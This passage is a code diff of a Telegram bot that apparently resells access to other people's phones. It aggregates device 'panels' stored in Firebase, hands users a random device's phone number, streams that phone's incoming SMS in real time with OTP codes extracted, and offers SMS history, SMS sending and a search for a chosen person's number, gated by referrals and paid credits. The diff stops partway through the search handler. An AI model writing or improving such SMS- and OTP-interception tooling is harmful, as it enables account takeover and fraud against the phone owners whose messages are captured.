@@ -1,6 +1,6 @@
 import TelegramBot from "node-telegram-bot-api";
 import { db, botUsersTable, panelsTable, giftCardsTable, referralsTable } from "@workspace/db";
-import { eq, and, sql } from "drizzle-orm";
+import { eq, and } from "drizzle-orm";
 import { fetchPanelDevices, fetchDeviceSms } from "./firebase";
 import { logger } from "./logger";
 
@@ -9,9 +9,9 @@ const BOT_USERNAME = process.env.BOT_USERNAME || "TBH_VIP_BOT";
 
 // Required channels to join
 const REQUIRED_CHANNELS = [
-  { username: "@TBH_BRAND", label: "TBH OFFICAL" },
-  { username: "@TBH_X_EARNING", label: "TBH_X_EARNING" },
-  { username: "@TBH_OFFICAL_CHAT", label: "TBH OFFICAL CHAT" },
+  { username: "TBH_BRAND", label: "TBH OFFICIAL" },
+  { username: "TBH_X_EARNING", label: "TBH X EARNING" },
+  { username: "TBH_OFFICAL_CHAT", label: "TBH OFFICIAL CHAT" },
 ];
 
 let bot: TelegramBot | null = null;
@@ -22,12 +22,10 @@ export function getBot(): TelegramBot | null {
 
 export function initBot(useWebhook = false): TelegramBot {
   if (bot) return bot;
-
   if (!BOT_TOKEN) {
     logger.error("TELEGRAM_BOT_TOKEN not set");
     throw new Error("TELEGRAM_BOT_TOKEN is required");
   }
-
   if (useWebhook) {
     bot = new TelegramBot(BOT_TOKEN, { webHook: false });
   } else {
@@ -35,7 +33,6 @@ export function initBot(useWebhook = false): TelegramBot {
     logger.info("Telegram bot started with polling");
     setupHandlers(bot);
   }
-
   return bot;
 }
 
@@ -44,50 +41,164 @@ export function processUpdate(update: TelegramBot.Update): void {
   bot.processUpdate(update);
 }
 
+// ─── Premium Emoji IDs ────────────────────────────────────────────────────────
+const E = {
+  lightning:    "5355051922862653659",   // ⚡
+  sparkle:      "5289722755871162900",   // ✨
+  rocket:       "5372917041193828849",   // 🚀
+  search:       "5368309348739074032",   // 🔎
+  signal:       "5352759161945867747",   // 📶
+  globe:        "5372849966689566579",   // 🌐
+  profile:      "5206318837489743801",   // 👤
+  gift:         "5359664288241829619",   // 🎁
+  coin:         "5334998226636390258",   // 🪙
+  back:         "5330237710655306682",   // ↩️
+  newnum:       "5319160079465857105",   // 🆕
+  eye:          "6206155797722830770",   // 👁
+  history:      "6206497372176913599",   // 📋
+  stop:         "6206479140040743133",   // 🛑
+  home:         "6204010762206189094",   // 🏠
+  check:        "6206188632747808299",   // ✅
+  lock:         "6206404510689007446",   // 🔒
+  fire:         "6206080502651164081",   // 🔥
+  star:         "6204162490515855272",   // ⭐
+  phone:        "6206446249181189526",   // 📱
+  crown:        "6206343625232619150",   // 👑
+  money:        "6206378324273403309",   // 💰
+  note:         "6206108815075579644",   // 🎵
+  warn:         "6206110936789423908",   // ⚠️
+  trophy:       "6203750195130274981",   // 🏆
+  link:         "6025878226260202192",   // 🔗
+  support:      "6026056450223116307",   // 🖥
+  buy:          "5395358455768837479",   // 💳
+  panel:        "6035152649790164056",   // 🖥
+  tick:         "5863980370340351884",   // ✔️
+  id:           "5404561694510833322",   // 🆔
+  name:         "5190806721286657692",   // 📛
+  joined:       "5195033767969839232",   // 📅
+  expire:       "5312361253610475399",   // ⌛
+  referral:     "5197269100878907942",   // 👥
+  credits:      "5253742260054409879",   // 💎
+  online:       "5440621591387980068",   // 🟢
+  offline:      "5294048127240655242",   // 🔴
+  battery:      "5291933173674957761",   // 🔋
+  sim:          "6269085886177087845",   // 📲
+  random:       "6017187377116614559",   // 🎲
+  status_ok:    "6019476152303750898",   // 🔵
+  wave:         "5247133031235329609",   // 〰️
+  key:          "5249273776079640466",   // 🔑
+  timer:        "5246842176050046092",   // ⏱
+  total:        "5246772116543512028",   // 📊
+  device:       "5237761614458933049",   // 📟
+  db:           "5235588635885054955",   // 🗄
+  sms:          "5258500422393415126",   // 💬
+  refresh:      "5301096984617166561",   // 🔄
+};
+
+// Premium emoji tag for HTML parse mode
+function em(id: string, fallback: string): string {
+  return `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
+}
+
 // ─── Keyboards ────────────────────────────────────────────────────────────────
+// Button color values (Telegram Bot API extended — color field):
+//   1 = blue/primary, 2 = green/positive, 3 = red/negative
+// These are passed as extra fields; standard clients that support it will render colors.
 
-function mainMenuKeyboard(): TelegramBot.ReplyKeyboardMarkup {
+type KBtn = TelegramBot.KeyboardButton & { color?: number };
+type KRow = KBtn[];
+type CKeyboard = { keyboard: KRow[]; resize_keyboard: boolean; is_persistent?: boolean };
+
+const GREEN = 2;
+const RED   = 3;
+// Blue = default (no color field or 1)
+
+function mainMenuKeyboard(): CKeyboard {
   return {
     keyboard: [
-      [{ text: "⚡ GET NUMBER" }, { text: "🌐 WEB PANEL" }],
-      [{ text: "📢 SEND SMS" }],
-      [{ text: "🌐 STATUS" }, { text: "🔎 SEARCH NUMBER" }],
-      [{ text: "📋 REFER & EARN" }, { text: "🎁 GIFT CARD" }],
-      [{ text: "🔴 BACK" }],
+      [
+        { text: "⚡ GET NUMBER",       color: GREEN },
+        { text: "🌐 WEB PANEL",        color: 1 },
+      ],
+      [
+        { text: "📋 SUPPORT ( DEVELOPER )", color: RED },
+      ],
+      [
+        { text: "🔎 SEARCH NUMBER",    color: 1 },
+        { text: "💳 BUY CREDIT",       color: GREEN },
+      ],
+      [
+        { text: "🌐 STATUS",           color: 1 },
+        { text: "👤 PROFILE",          color: 1 },
+      ],
+      [
+        { text: "🎁 GIFT CARD",        color: GREEN },
+        { text: "🪙 REFER & EARN",     color: GREEN },
+      ],
+      [
+        { text: "↩️ BACK",            color: RED },
+      ],
     ],
     resize_keyboard: true,
+    is_persistent: true,
   };
 }
 
-function numberMenuKeyboard(): TelegramBot.ReplyKeyboardMarkup {
+function numberMenuKeyboard(): CKeyboard {
   return {
     keyboard: [
-      [{ text: "🆕 NEW NUMBER" }, { text: "🔥 WATCH SMS" }],
-      [{ text: "🔗 SMS HISTORY" }, { text: "🛑 STOP WATCH" }],
-      [{ text: "🔴 BACK" }],
+      [
+        { text: "🆕 NEW NUMBER",       color: GREEN },
+        { text: "🎵 WATCH SMS",        color: GREEN },
+      ],
+      [
+        { text: "📋 SMS HISTORY",      color: 1 },
+        { text: "🛑 STOP WATCH",       color: RED },
+      ],
+      [
+        { text: "📢 SEND SMS",         color: 1 },
+        { text: "👁 NUMBERS HISTORY",  color: 1 },
+      ],
+      [
+        { text: "↩️ BACK",            color: RED },
+      ],
     ],
     resize_keyboard: true,
+    is_persistent: true,
   };
 }
 
-function watchMenuKeyboard(): TelegramBot.ReplyKeyboardMarkup {
+function watchMenuKeyboard(): CKeyboard {
   return {
     keyboard: [
-      [{ text: "🛑 STOP WATCH" }, { text: "🔗 SMS HISTORY" }],
-      [{ text: "🔴 BACK" }],
+      [
+        { text: "🛑 STOP WATCH",       color: RED },
+        { text: "📋 SMS HISTORY",      color: 1 },
+      ],
+      [
+        { text: "↩️ BACK",            color: RED },
+      ],
     ],
     resize_keyboard: true,
+    is_persistent: true,
   };
 }
 
-function cancelKeyboard(): TelegramBot.ReplyKeyboardMarkup {
+function cancelKeyboard(): CKeyboard {
   return {
-    keyboard: [[{ text: "🔴 CANCEL" }]],
+    keyboard: [
+      [{ text: "↩️ CANCEL", color: RED }],
+    ],
     resize_keyboard: true,
+    is_persistent: true,
   };
 }
 
 // ─── Helpers ──────────────────────────────────────────────────────────────────
+
+function divider(): string {
+  return "〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️";
+}
 
 function generateReferralCode(telegramId: string): string {
   return `ref_${telegramId}`;
@@ -102,7 +213,6 @@ async function getOrCreateUser(msg: TelegramBot.Message, referredBy?: string | n
 
   if (existing) return existing;
 
-  // New user — give 1hr free access
   const expiresAt = new Date(Date.now() + 60 * 60 * 1000);
   const [user] = await db
     .insert(botUsersTable)
@@ -116,7 +226,6 @@ async function getOrCreateUser(msg: TelegramBot.Message, referredBy?: string | n
     })
     .returning();
 
-  // Handle referral reward
   if (referredBy) {
     const [referrer] = await db
       .select()
@@ -127,24 +236,24 @@ async function getOrCreateUser(msg: TelegramBot.Message, referredBy?: string | n
       const newCount = referrer.referralCount + 1;
       const now = new Date();
 
-      // Calculate new Get Number expiry (+12hr)
       const currentExpiry = referrer.getNumberExpiresAt
         ? new Date(Math.max(referrer.getNumberExpiresAt.getTime(), now.getTime()))
         : now;
       const newExpiry = new Date(currentExpiry.getTime() + 12 * 60 * 60 * 1000);
 
-      // Check if reaching 10 referrals — unlock Send SMS
       const sendSmsUnlocked = newCount >= 10 ? true : referrer.sendSmsUnlocked;
-      const newSmsCredits = newCount >= 10 && !referrer.sendSmsUnlocked
-        ? referrer.smsCredits + 500
-        : newCount > 10
-        ? referrer.smsCredits + 100
-        : referrer.smsCredits;
+      const newSmsCredits =
+        newCount >= 10 && !referrer.sendSmsUnlocked
+          ? referrer.smsCredits + 500
+          : newCount > 10
+          ? referrer.smsCredits + 100
+          : referrer.smsCredits;
 
-      // Web panel unlock at 10 referrals (+24hr)
       let webPanelExpiry = referrer.webPanelExpiresAt;
       if (newCount === 10) {
-        const webBase = webPanelExpiry ? new Date(Math.max(webPanelExpiry.getTime(), now.getTime())) : now;
+        const webBase = webPanelExpiry
+          ? new Date(Math.max(webPanelExpiry.getTime(), now.getTime()))
+          : now;
         webPanelExpiry = new Date(webBase.getTime() + 24 * 60 * 60 * 1000);
       } else if (newCount > 10 && webPanelExpiry) {
         const webBase = new Date(Math.max(webPanelExpiry.getTime(), now.getTime()));
@@ -153,19 +262,10 @@ async function getOrCreateUser(msg: TelegramBot.Message, referredBy?: string | n
 
       await db
         .update(botUsersTable)
-        .set({
-          referralCount: newCount,
-          getNumberExpiresAt: newExpiry,
-          sendSmsUnlocked,
-          smsCredits: newSmsCredits,
-          webPanelExpiresAt: webPanelExpiry,
-        })
+        .set({ referralCount: newCount, getNumberExpiresAt: newExpiry, sendSmsUnlocked, smsCredits: newSmsCredits, webPanelExpiresAt: webPanelExpiry })
         .where(eq(botUsersTable.id, referrer.id));
 
-      await db.insert(referralsTable).values({
-        referrerId: referrer.id,
-        referredTelegramId: telegramId,
-      });
+      await db.insert(referralsTable).values({ referrerId: referrer.id, referredTelegramId: telegramId });
     }
   }
 
@@ -179,68 +279,73 @@ async function hasGetNumberAccess(user: { getNumberExpiresAt: Date | null }): Pr
 
 async function getAllOnlineDevices() {
   const panels = await db.select().from(panelsTable);
-  const allDevices = [];
+  const all = [];
   for (const panel of panels) {
     const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
-    allDevices.push(...devices.filter((d) => d.status));
+    all.push(...devices.filter((d) => d.status));
   }
-  return allDevices;
+  return all;
 }
 
-async function getDeviceFromPanel(panelId: number, deviceId: string) {
-  const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, panelId));
-  if (!panel) return null;
-  const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
-  return devices.find((d) => d.id === deviceId) || null;
-}
-
-// Watch polling interval map: userId → intervalId
+// Watch polling: userId → intervalId
 const watchIntervals = new Map<string, NodeJS.Timeout>();
-const watchLastSms = new Map<string, string>(); // userId → last SMS text
+const watchLastSms   = new Map<string, string>();
 
-// ─── Bot Handlers ─────────────────────────────────────────────────────────────
+// ─── Handlers ─────────────────────────────────────────────────────────────────
 
 function setupHandlers(bot: TelegramBot) {
   bot.on("message", async (msg) => {
     if (!msg.from || !msg.text) return;
-    const chatId = msg.chat.id;
-    const text = msg.text.trim();
+    const chatId     = msg.chat.id;
+    const text       = msg.text.trim();
     const telegramId = String(msg.from.id);
 
     try {
-      // Handle /start with optional referral
+      // ── /start ──────────────────────────────────────────────────────────
       if (text.startsWith("/start")) {
-        const parts = text.split(" ");
-        const param = parts[1] || null;
+        const param      = text.split(" ")[1] || null;
         const referredBy = param?.startsWith("ref_") ? param : null;
+        const user       = await getOrCreateUser(msg, referredBy);
 
-        const user = await getOrCreateUser(msg, referredBy);
-
+        // Welcome message with premium emoji
         await bot.sendMessage(
           chatId,
-          `━━━━━━━━━━━━━━━━━━━\nWELCOME TO TBH 😊\n━━━━━━━━━━━━━━━━━━━\n🎁 AAPKO 1 GHANTE KE LIYE GET NUMBER FREE MILA!\nKOI LIMIT NAHI — 1HR TAK FULL ACCESS.\n\n⏰ 1HR KE BAAD GET NUMBER LOCK HO JAYEGA.\nREFFER BUTTON DABAO AUR APNA REFERRAL LINK SHARE KARO — HAR REFERRAL PE EXTRA HOURS MILEGA!`,
-          { reply_markup: { remove_keyboard: true } }
+          `${em(E.lightning, "⚡")} <b>TBH VIP BOT</b> ${em(E.lightning, "⚡")}\n` +
+          `${divider()}\n\n` +
+          `${em(E.sparkle, "✨")} <b>WELCOME TO TBH VIP BOT!</b>\n\n` +
+          `${em(E.lightning, "⚡")} <b>AAPKO 1 GHANTE KE LIYE GET NUMBER FREE MILA!</b>\n` +
+          `KOI LIMIT NAHI — 1HR TAK FULL ACCESS.\n\n` +
+          `${em(E.expire, "⌛")} 1HR KE BAAD GET NUMBER LOCK HO JAYEGA.\n` +
+          `${em(E.coin, "🪙")} REFER KARO AUR EXTRA HOURS PAO!`,
+          { parse_mode: "HTML", reply_markup: { remove_keyboard: true } }
         );
 
-        // Show channel join buttons
+        // Channel join verification
+        const channelButtons = REQUIRED_CHANNELS.map((ch) => [
+          { text: `${em(E.check, "✅")} ${ch.label}`, url: `https://t.me/${ch.username}` } as any,
+        ]);
+        channelButtons.push([
+          { text: `${em(E.check, "✅")} I JOINED — CHECK NOW`, callback_data: "check_joined" } as any,
+        ]);
+
         await bot.sendMessage(
           chatId,
-          `🔒 JOIN REQUIRED\n\nTO USE THIS BOT YOU MUST JOIN ALL OF THESE CHANNELS FIRST:`,
+          `${em(E.lock, "🔒")} <b>CHANNEL VERIFICATION REQUIRED</b>\n` +
+          `${divider()}\n\n` +
+          `TBH VIP BOT KA FULL ACCESS PANE KE LIYE\n` +
+          `NICHE DIYE GAYE SABHI OFFICIAL CHANNELS JOIN KARO.\n\n` +
+          `${em(E.check, "✅")} CHANNELS JOIN KARNE KE BAAD <b>I JOINED — CHECK NOW</b> BUTTON DABAO.`,
           {
+            parse_mode: "HTML",
             reply_markup: {
-              inline_keyboard: [
-                ...REQUIRED_CHANNELS.map((ch) => [
-                  { text: `Join ${ch.label}`, url: `https://t.me/${ch.username.replace("@", "")}` },
-                ]),
-                [{ text: "✅ I Joined — Check Again", callback_data: "check_joined" }],
-              ],
+              inline_keyboard: channelButtons,
             },
           }
         );
         return;
       }
 
-      // Check if user exists
+      // ── Fetch user ───────────────────────────────────────────────────────
       const [user] = await db
         .select()
         .from(botUsersTable)
@@ -251,94 +356,164 @@ function setupHandlers(bot: TelegramBot) {
         return;
       }
 
-      // ─── Main menu buttons ───────────────────────────────────────────────
+      // ── Main menu navigation ─────────────────────────────────────────────
 
-      if (text === "⚡ GET NUMBER" || text === "🆕 NEW NUMBER") {
+      if (text === "⚡ GET NUMBER") {
         const hasAccess = await hasGetNumberAccess(user);
         if (!hasAccess) {
           await bot.sendMessage(
             chatId,
-            `⏰ GET NUMBER ACCESS EXPIRED!\n\nAccess khatam ho gaya. Extend karne ke liye referrals karo:\n• Har referral = +12hr access\n\nREFER & EARN button dabao aur apna link share karo.`,
-            { reply_markup: mainMenuKeyboard() }
+            `${em(E.expire, "⌛")} <b>GET NUMBER ACCESS EXPIRED!</b>\n\n` +
+            `ACCESS KHATAM HO GAYA.\n` +
+            `${em(E.coin, "🪙")} HAR REFERRAL = +12HR ACCESS\n\n` +
+            `REFER & EARN DABAO AUR LINK SHARE KARO.`,
+            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
           );
           return;
         }
 
-        await bot.sendMessage(chatId, "⚡ Number ready! Fetching from panels — please wait...");
+        await bot.sendMessage(
+          chatId,
+          `${em(E.lightning, "⚡")} <b>GENERATING A RANDOM NUMBER...</b>`,
+          { parse_mode: "HTML" }
+        );
 
         const onlineDevices = await getAllOnlineDevices();
         if (onlineDevices.length === 0) {
           await bot.sendMessage(
             chatId,
-            "📵 No online numbers available right now. Please try again later.",
-            { reply_markup: mainMenuKeyboard() }
+            `${em(E.offline, "🔴")} <b>NO ACTIVE NUMBERS RIGHT NOW!</b>\n\n` +
+            `${em(E.refresh, "🔄")} THODI DER BAAD DOBARA TRY KARO — NUMBERS REGULARLY ACTIVE HOTE HAIN.`,
+            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
           );
           return;
         }
 
-        // Pick random device
         const device = onlineDevices[Math.floor(Math.random() * onlineDevices.length)];
 
-        // Assign device to user
         await db
           .update(botUsersTable)
           .set({ assignedDeviceId: device.id, assignedPanelId: device.panelId, state: "number_menu" })
           .where(eq(botUsersTable.id, user.id));
 
-        const remainingMs = user.getNumberExpiresAt
-          ? Math.max(0, user.getNumberExpiresAt.getTime() - Date.now())
-          : 0;
+        const remainingMs  = user.getNumberExpiresAt ? Math.max(0, user.getNumberExpiresAt.getTime() - Date.now()) : 0;
         const remainingMin = Math.floor(remainingMs / 60000);
 
         await bot.sendMessage(
           chatId,
-          `📱 Your Number\n\n🔵 SIM 1 : ${device.phoneNumber}\n🟢 SIM 2 : ${device.phoneNumber}\n\n📱 Model   : ${device.model}\n🔋 Battery : ${device.battery}\n📅 Last SMS : ${device.lastSeen || "N/A"}\n📨 Total SMS : ${device.totalSms}\n\n✅ Ready to receive OTPs\n\n⏰ Active — ${remainingMin}m remaining`,
-          { reply_markup: numberMenuKeyboard() }
+          `${em(E.lightning, "⚡")} <b>RANDOM NUMBER GENERATED!</b>\n` +
+          `${divider()}\n\n` +
+          `${em(E.id, "🆔")} <b>DEVICE ID</b>   : N${device.id}\n` +
+          `${em(E.phone, "📱")} <b>NUMBER</b>     : ${device.phoneNumber || "Unknown"}\n` +
+          `${em(E.profile, "👤")} <b>DEVICE NAME</b> : ${device.model || device.id}\n` +
+          `${em(E.db, "🗄")} <b>DATABASE</b>   : ${device.panelId}\n` +
+          `${em(E.lightning, "⚡")} <b>STATUS</b>     : ${em(E.check, "✅")} ONLINE\n` +
+          `${em(E.battery, "🔋")} <b>BATTERY</b>    : ${device.battery || "—"}\n` +
+          `${divider()}\n\n` +
+          `${em(E.timer, "⏱")} ACCESS — ${remainingMin}m REMAINING\n` +
+          `${em(E.history, "📋")} YOU CAN VIEW THIS NUMBER IN YOUR SMS HISTORY ANYTIME.`,
+          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
         );
         return;
       }
 
-      if (text === "🔥 WATCH SMS") {
+      if (text === "🆕 NEW NUMBER") {
+        const hasAccess = await hasGetNumberAccess(user);
+        if (!hasAccess) {
+          await bot.sendMessage(
+            chatId,
+            `${em(E.expire, "⌛")} <b>ACCESS EXPIRED!</b> Refer karke access badhao.`,
+            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
+          );
+          return;
+        }
+
+        await bot.sendMessage(
+          chatId,
+          `${em(E.lightning, "⚡")} <b>GENERATING A RANDOM NUMBER...</b>`,
+          { parse_mode: "HTML" }
+        );
+
+        const onlineDevices = await getAllOnlineDevices();
+        if (onlineDevices.length === 0) {
+          await bot.sendMessage(
+            chatId,
+            `${em(E.offline, "🔴")} <b>NO ACTIVE NUMBERS RIGHT NOW!</b>\n\n` +
+            `${em(E.refresh, "🔄")} THODI DER BAAD DOBARA TRY KARO.`,
+            { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
+          );
+          return;
+        }
+
+        const device = onlineDevices[Math.floor(Math.random() * onlineDevices.length)];
+
+        await db
+          .update(botUsersTable)
+          .set({ assignedDeviceId: device.id, assignedPanelId: device.panelId })
+          .where(eq(botUsersTable.id, user.id));
+
+        const remainingMs  = user.getNumberExpiresAt ? Math.max(0, user.getNumberExpiresAt.getTime() - Date.now()) : 0;
+        const remainingMin = Math.floor(remainingMs / 60000);
+
+        await bot.sendMessage(
+          chatId,
+          `${em(E.lightning, "⚡")} <b>RANDOM NUMBER GENERATED!</b>\n` +
+          `${divider()}\n\n` +
+          `${em(E.id, "🆔")} <b>DEVICE ID</b>   : N${device.id}\n` +
+          `${em(E.phone, "📱")} <b>NUMBER</b>     : ${device.phoneNumber || "Unknown"}\n` +
+          `${em(E.profile, "👤")} <b>DEVICE NAME</b> : ${device.model || device.id}\n` +
+          `${em(E.db, "🗄")} <b>DATABASE</b>   : ${device.panelId}\n` +
+          `${em(E.lightning, "⚡")} <b>STATUS</b>     : ${em(E.check, "✅")} ONLINE\n` +
+          `${em(E.battery, "🔋")} <b>BATTERY</b>    : ${device.battery || "—"}\n` +
+          `${divider()}\n\n` +
+          `${em(E.timer, "⏱")} ACCESS — ${remainingMin}m REMAINING\n` +
+          `${em(E.history, "📋")} YOU CAN VIEW THIS NUMBER IN YOUR SMS HISTORY ANYTIME.`,
+          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
+        );
+        return;
+      }
+
+      if (text === "🎵 WATCH SMS") {
         if (!user.assignedDeviceId || !user.assignedPanelId) {
-          await bot.sendMessage(chatId, "First get a number using GET NUMBER.", { reply_markup: mainMenuKeyboard() });
+          await bot.sendMessage(chatId, "First GET NUMBER dabao.", { reply_markup: mainMenuKeyboard() as any });
           return;
         }
 
         const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, user.assignedPanelId));
         if (!panel) {
-          await bot.sendMessage(chatId, "Panel not found.", { reply_markup: mainMenuKeyboard() });
+          await bot.sendMessage(chatId, "Panel not found.", { reply_markup: mainMenuKeyboard() as any });
           return;
         }
 
-        // Clear existing watch
-        const existingInterval = watchIntervals.get(telegramId);
-        if (existingInterval) clearInterval(existingInterval);
+        const existing = watchIntervals.get(telegramId);
+        if (existing) clearInterval(existing);
 
         await bot.sendMessage(
           chatId,
-          `👁 WATCHING FOR OTPS...\n\n📱 NUMBER: ${user.assignedDeviceId}\n\nNEW OTP/SMS WILL ARRIVE HERE IN REAL-TIME.\nSPAM / RECHARGE / TRANSACTION SMS ARE AUTO-BLOCKED.\n\nTAP STOP WATCH TO STOP.`,
-          { reply_markup: watchMenuKeyboard() }
+          `${em(E.eye, "👁")} <b>WATCHING FOR OTPS...</b>\n` +
+          `${divider()}\n\n` +
+          `${em(E.phone, "📱")} <b>NUMBER:</b> ${user.assignedDeviceId}\n\n` +
+          `NEW OTP/SMS WILL ARRIVE HERE IN REAL-TIME.\n` +
+          `${em(E.warn, "⚠️")} SPAM / RECHARGE SMS ARE AUTO-BLOCKED.\n\n` +
+          `${em(E.stop, "🛑")} TAP <b>STOP WATCH</b> TO STOP.`,
+          { parse_mode: "HTML", reply_markup: watchMenuKeyboard() as any }
         );
 
-        // Start polling every 10s
         const intervalId = setInterval(async () => {
           try {
-            const smsMessages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, user.assignedDeviceId!);
-            if (smsMessages.length === 0) return;
-
-            const latest = smsMessages[0];
-            const key = `${latest.sender}:${latest.text}:${latest.time}`;
-            const lastKey = watchLastSms.get(telegramId);
-
-            if (key !== lastKey) {
+            const msgs = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, user.assignedDeviceId!);
+            if (msgs.length === 0) return;
+            const latest = msgs[0];
+            const key    = `${latest.sender}:${latest.text}:${latest.time}`;
+            if (key !== watchLastSms.get(telegramId)) {
               watchLastSms.set(telegramId, key);
-              // Check if it looks like an OTP
-              const otpMatch = latest.text.match(/\b\d{4,8}\b/);
-              const otp = otpMatch ? `\n\n🔑 OTP: ${otpMatch[0]}` : "";
+              const otp = latest.text.match(/\b\d{4,8}\b/)?.[0];
               await bot.sendMessage(
                 chatId,
-                `📩 NEW SMS RECEIVED!\n\nFrom: ${latest.sender}\nTime: ${latest.time}\n\n${latest.text}${otp}`,
-                { reply_markup: watchMenuKeyboard() }
+                `${em(E.sms, "💬")} <b>NEW SMS RECEIVED!</b>\n\n` +
+                `From: <code>${latest.sender}</code>\nTime: ${latest.time}\n\n${latest.text}` +
+                (otp ? `\n\n${em(E.key, "🔑")} <b>OTP: ${otp}</b>` : ""),
+                { parse_mode: "HTML", reply_markup: watchMenuKeyboard() as any }
               );
             }
           } catch (err) {
@@ -352,108 +527,142 @@ function setupHandlers(bot: TelegramBot) {
       }
 
       if (text === "🛑 STOP WATCH") {
-        const intervalId = watchIntervals.get(telegramId);
-        if (intervalId) {
-          clearInterval(intervalId);
-          watchIntervals.delete(telegramId);
-          watchLastSms.delete(telegramId);
-        }
+        const iv = watchIntervals.get(telegramId);
+        if (iv) { clearInterval(iv); watchIntervals.delete(telegramId); watchLastSms.delete(telegramId); }
         await db.update(botUsersTable).set({ state: "number_menu" }).where(eq(botUsersTable.id, user.id));
-        await bot.sendMessage(chatId, "⏹ Watch stopped.", { reply_markup: numberMenuKeyboard() });
+        await bot.sendMessage(
+          chatId,
+          `${em(E.stop, "🛑")} <b>WATCH STOPPED.</b>`,
+          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
+        );
         return;
       }
 
-      if (text === "🔗 SMS HISTORY") {
+      if (text === "📋 SMS HISTORY") {
         if (!user.assignedDeviceId || !user.assignedPanelId) {
-          await bot.sendMessage(chatId, "First get a number using GET NUMBER.", { reply_markup: mainMenuKeyboard() });
+          await bot.sendMessage(chatId, "First GET NUMBER dabao.", { reply_markup: mainMenuKeyboard() as any });
           return;
         }
-
         const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, user.assignedPanelId));
         if (!panel) {
-          await bot.sendMessage(chatId, "Panel not found.", { reply_markup: numberMenuKeyboard() });
+          await bot.sendMessage(chatId, "Panel not found.", { reply_markup: numberMenuKeyboard() as any });
           return;
         }
-
         const messages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, user.assignedDeviceId);
         if (messages.length === 0) {
-          await bot.sendMessage(chatId, "📭 No SMS history found.", { reply_markup: numberMenuKeyboard() });
+          await bot.sendMessage(
+            chatId,
+            `${em(E.history, "📋")} <b>NO SMS HISTORY FOUND.</b>`,
+            { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
+          );
           return;
         }
-
-        const recent = messages.slice(0, 10);
-        const formatted = recent
-          .map((m, i) => `${i + 1}. From: ${m.sender}\n   Time: ${m.time}\n   ${m.text.slice(0, 100)}`)
+        const lines = messages
+          .slice(0, 10)
+          .map((m, i) => `${i + 1}. <b>${m.sender}</b>\n   ${m.time}\n   ${m.text.slice(0, 100)}`)
           .join("\n\n");
 
         await bot.sendMessage(
           chatId,
-          `📋 SMS History (${messages.length} msgs)\n\n${formatted}`,
-          { reply_markup: numberMenuKeyboard() }
+          `${em(E.history, "📋")} <b>SMS HISTORY (${messages.length} msgs)</b>\n${divider()}\n\n${lines}`,
+          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
+        );
+        return;
+      }
+
+      if (text === "👁 NUMBERS HISTORY") {
+        if (!user.assignedDeviceId || !user.assignedPanelId) {
+          await bot.sendMessage(chatId, "Koi number assign nahi hai abhi.", { reply_markup: mainMenuKeyboard() as any });
+          return;
+        }
+        await bot.sendMessage(
+          chatId,
+          `${em(E.history, "📋")} <b>NUMBERS HISTORY</b>\n${divider()}\n\n` +
+          `${em(E.phone, "📱")} <b>LAST ASSIGNED:</b> N${user.assignedDeviceId}\n` +
+          `${em(E.db, "🗄")} <b>PANEL ID:</b> ${user.assignedPanelId}`,
+          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
         );
         return;
       }
 
       if (text === "🌐 STATUS") {
         const panels = await db.select().from(panelsTable);
-        let totalOnline = 0;
-        let totalOffline = 0;
-        let totalDevices = 0;
-
+        let totalOnline = 0, totalOffline = 0, totalDevices = 0;
         for (const panel of panels) {
           const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
-          const online = devices.filter((d) => d.status).length;
-          const offline = devices.length - online;
-          totalOnline += online;
-          totalOffline += offline;
+          totalOnline  += devices.filter((d) => d.status).length;
+          totalOffline += devices.filter((d) => !d.status).length;
           totalDevices += devices.length;
         }
 
         await bot.sendMessage(
           chatId,
-          `📊 STATUS REPORT\n\n📱 All Panels — Total\n🟢 Online   : ${totalOnline}\n🔴 Offline  : ${totalOffline}\n📱 Grand Total : ${totalDevices}\n\n🔄 Auto-refresh: every 1hr`,
-          { reply_markup: mainMenuKeyboard() }
+          `${em(E.globe, "🌐")} <b>STATUS REPORT</b>\n` +
+          `${divider()}\n\n` +
+          `${em(E.total, "📊")} <b>ALL PANELS — TOTAL</b>\n` +
+          `${em(E.check, "✅")} <b>ONLINE</b>      : ${totalOnline}\n` +
+          `${em(E.fire, "🔥")} <b>OFFLINE</b>     : ${totalOffline}\n` +
+          `${em(E.total, "📊")} <b>GRAND TOTAL</b> : ${totalDevices}\n\n` +
+          `${em(E.rocket, "🚀")} <b>LIVE DATA</b>`,
+          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
         );
         return;
       }
 
       if (text === "🔎 SEARCH NUMBER") {
         const panels = await db.select().from(panelsTable);
-        const totalOnline = [];
+        let totalOnline = 0;
         for (const panel of panels) {
-          const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
-          totalOnline.push(...devices.filter((d) => d.status));
+          const devs = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
+          totalOnline += devs.filter((d) => d.status).length;
         }
-
         await db.update(botUsersTable).set({ state: "search_number" }).where(eq(botUsersTable.id, user.id));
-
         await bot.sendMessage(
           chatId,
-          `🔎 SEARCH NUMBER\n\n🌐 ALL PANELS CONNECTED. CURRENTLY ${totalOnline.length} ONLINE NUMBERS LOADED.\n\nENTER THE PHONE NUMBER YOU WANT TO SEARCH:\n(Jiska number dhoondna hai)\n\nExample: 9876543210\n\nTAP BACK TO CANCEL.`,
